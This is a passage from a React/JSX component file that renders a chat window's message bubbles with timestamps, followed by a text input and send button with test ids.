                    key={msg.id}
                    className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
                  >
                    <div
                      className={`max-w-[80%] px-4 py-2 rounded-2xl ${
                        msg.sender === 'user'
                          ? 'bg-blue-600 text-white rounded-br-md'
                          : 'bg-white text-slate-800 border border-slate-200 rounded-bl-md'
                      }`}
                    >
                      <p className="text-sm whitespace-pre-wrap">{msg.message}</p>
                      <p className={`text-xs mt-1 ${msg.sender === 'user' ? 'text-blue-100' : 'text-slate-400'}`}>
                        {new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                      </p>
                    </div>
                  </div>
                ))
              )}
            </div>
            
            <div className="p-3 border-t border-slate-200 bg-white">
              <div className="flex gap-2">
                <Input
                  placeholder="Type your message..."
                  value={newMessage}
                  onChange={(e) => setNewMessage(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendMessage()}
                  disabled={isSendingMessage}
                  className="flex-1"
                  data-testid="input-chat-message"
                />
                <Button
                  onClick={sendMessage}
                  disabled={!newMessage.trim() || isSendingMessage}
                  size="sm"
                  className="bg-blue-600 hover:bg-blue-700"
                  data-testid="button-send-message"
                >
                  <Send className="h-4 w-4" />
                </Button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
